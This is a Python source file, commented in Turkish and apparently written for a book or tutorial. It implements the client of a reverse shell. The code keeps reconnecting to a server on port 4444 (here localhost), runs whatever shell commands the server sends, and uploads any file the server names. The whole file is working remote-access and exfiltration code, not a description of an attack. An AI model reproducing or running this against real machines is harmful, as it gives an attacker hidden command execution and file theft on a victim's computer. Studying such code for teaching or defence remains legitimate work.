#Kütüphanelerimizi Yükledik
import socket
import time
import os
import subprocess

#Sonsuz Döngüyü Oluşturduk
while True:
    #Try Bloğunu Oluşturduk
    try:
        #Bağlantı İçin Soketimizi Oluşturduk
        s = socket.socket()

        #Bağlantı İçin Host ve Port Adresimizi Verdik
        host = "localhost"
        port = 4444

        #Oluşturduğumuz Soketin connect Yani Bağlantı
        #Kodunu Yazdık ve Adresimizi ile Port Adresimizi
        #Verdik ve Bağlantıyı Sağladık
        s.connect((host, port))

        #WHİLE KISMINI KİTABA EKLEMEDİM EKLEYİNCE SİL BURAYI :P
        while True:
            #Karşı taraftan veri bekledik
            veri = s.recv(1024).decode("utf-8")

            #Veriyi aldık ve içerğini kontrol ettik
            #eğer veri cmd ise şimdilik pas geçeceğiz
            if veri == "cmd":
                
                while True:

                    veri = s.recv(1024).decode("utf-8")

                    if veri[:2] == "cd":

                        try:
                            os.chdir(veri[3:])
                            s.send(os.getcwd().encode("utf-8"))

                        except FileNotFoundError:
                            s.send("Dosya Bulunamadı...".encode("utf-8"))
                    
                    elif veri == "quit":
                        break
                    
                    else:

                        if len(veri) > 0:
                            
                            cmd = subprocess.Popen(veri, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                            cikti = cmd.stdout.read() + cmd.stderr.read()
                            cikti_str = str(cikti, encoding="cp857")
                            konum = os.getcwd()

                            s.send(str.encode(cikti_str + "\n" + "Bulunduğunzu Yer: " + konum, encoding="utf-8"))

                        else:

                            s.send(b" ")

            # Eğer gelen veri 'dosya transferi' ise
            elif veri == "dosya transferi":

                # Server tarafından aldığımız konum bilgisini değişkene atadık
                konum = s.recv(1024).decode('utf-8')

                # Dosya boyutunu öğrenim string değer olarak sakladık
                boyut = str(os.path.getsize(konum))

                # Boyut bilgisini server tarafına gönderdik
                s.send(boyut.encode('utf-8'))

                # Server tarafından boş byte'ın gelmesini bekledik
                s.recv(1024)

                # Server tarafından istenilen konumu okunabilir hale getirip
                # 'as dosya' diyerek dosya değişkenine atadık
                with open(konum, "rb") as dosya:

                    # dosyayı 1024 byte şeklinde okuyup veri değişkenine
                    # atadık 
                    veri = dosya.read(1024)

                    # Sonsuz döngü açtık ve veri okunabiliyorsa
                    # yani True ise while döngüsüne girmesini sağladık
                    while veri:

                        # Veri değişkenini server tarafına gönderdik
                        s.send(veri)

                        # Veriyi tekrar 1024 byte olarak okuduk ve
                        # her while döngüsü dönmesinde veriyi tekrar
                        # kontrol edip server tarafına gönderdik
                        veri = dosya.read(1024)



            #eğer veri cmd veya başka birşey değilse karşı tarafa boş bir byte yollayacağız.
            else:
                s.send(b" ")

    #Hata yakalamak İçin Except Kodunu Çalıştırdık
    except:
        #Hata Alırsa Ekrana Bağlantı Hatası Çıktısını
        #Ekrana Verdik ve Programı 5 Saniye Kadar
        #Uyuttuk Daha Sonra Program While Döngüsü
        #Yüzünden Tekrar Çalışacak
        print("Bağlantı Hatası")
        time.sleep(5)


